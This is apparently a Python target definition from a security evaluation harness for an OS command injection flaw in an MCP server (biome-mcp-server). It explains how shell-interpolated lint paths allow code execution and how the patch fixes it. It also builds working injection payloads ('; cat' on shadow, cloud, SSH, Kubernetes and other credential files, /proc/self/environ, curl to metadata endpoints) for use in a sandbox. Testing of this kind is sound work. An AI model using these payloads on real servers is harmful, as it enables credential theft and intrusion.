"""CVE-2026-3680: OS command injection in biome-mcp-server (command execution).

The vulnerable server builds `biome lint|format <configPath> <paths.join(" ")>` by string
interpolation and hands it to child_process.exec (a shell), so a shell metacharacter in any
`paths` element runs an arbitrary command whose stdout the tool returns. The patched commit swaps
exec for execFile("biome", [..., "--", ...paths]), passing the paths as literal argv, so no shell
sees them and no nonce surfaces. The advertised biome-lint and biome-format both carry the flaw;
the exploit targets biome-lint.

The biome binary is the external dependency and is stubbed to a benign no-op in the image, so the
injection runs in the real server's own exec/execFile chain, not in the stub. The reach is
command_execution, so every kept place is read by running a command: cat for files, cat
/proc/self/environ for the env var, whoami/id for the account, hostname for the UTS name, curl for
the internal HTTP endpoints.
"""

import re

from evals.cve_environments import command_injection_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Place, Places, PlantKind
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_planting_spec import resolve_container_path
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

SERVICE = "holdout-2026-3680-biome"
PATCHED = "holdout-2026-3680-biome-patched"
# The server's own install dir, root-owned and world-traversable. The /srv layout temp root is
# host-owned 0700, so a non-host-uid child (tsx/esbuild spawns at import) with a cwd under it dies
# with EACCES. This flaw needs no scope dir, so the cwd sits in /opt/server.
WORKING_DIRECTORY = "/opt/server"
TOOL = "biome-lint"

AIM = re.compile(r"[;`$|&]")  # a shell metacharacter: in every exploit, absent from the benign call

KEPT_PLACES = (
    "process-account-identity",
    "etc-shadow",
    "container-hostname",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "proc-environ",
    "kube-config",
    "run-secrets",
    "k8s-sa-token",
    "imds",
    "ecs-task-credentials",
    "eks-pod-identity",
    "etc-hosts",
    "auth-log",
)


def _payload_for(place: Place) -> str:
    kind = place.kind
    if kind is PlantKind.FILE:
        coords = place.coordinates
        paths = coords.paths if coords.paths is not None else (coords.path,)
        resolved = (resolve_container_path(p, WORKING_DIRECTORY) for p in paths if p is not None)
        return "".join(f"; cat {p} 2>/dev/null" for p in resolved)
    if kind is PlantKind.ENV:
        return "; cat /proc/self/environ 2>/dev/null"
    if kind is PlantKind.ACCOUNT:
        return "; whoami; id -un"
    if kind is PlantKind.HOSTNAME:
        return "; hostname; cat /etc/hostname 2>/dev/null"
    if kind is PlantKind.HTTP_ENDPOINT:
        return f"; curl -s http://{place.coordinates.host}{place.coordinates.path}"
    raise ValueError(f"{place.id}: kind {kind} has no command-execution exploit")


def _exploit(place_id: str):
    async def run(places: Places, client: MCPClientPort) -> None:
        await client.call_tool(TOOL, {"paths": [_payload_for(places[place_id])]})

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    await client.call_tool(TOOL, {"paths": ["."]})


TARGET = CVETarget(
    cve_id="CVE-2026-3680",
    severity="CVSS 8.8 (v3.1, placeholder)",
    mechanism=MechanismClass.COMMAND_EXECUTION,
    aim=AIM,
    reaches=frozenset({"command_execution"}),
    kept_places=KEPT_PLACES,
    images=(SERVICE,),
    server_image=SERVICE,
    patched_image=PATCHED,
    planting_host=PlantingHost(SymbolicUser.UNPRIVILEGED, WORKING_DIRECTORY, has_network=False),
    builder=command_injection_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "OS command injection: the biome-lint and biome-format tools interpolate their "
        "attacker-controlled paths into a shell string run with child_process.exec, so a path "
        "element with a shell metacharacter (`; <cmd>`) executes it in the server's container."
    ),
    tools_filter=None,
)
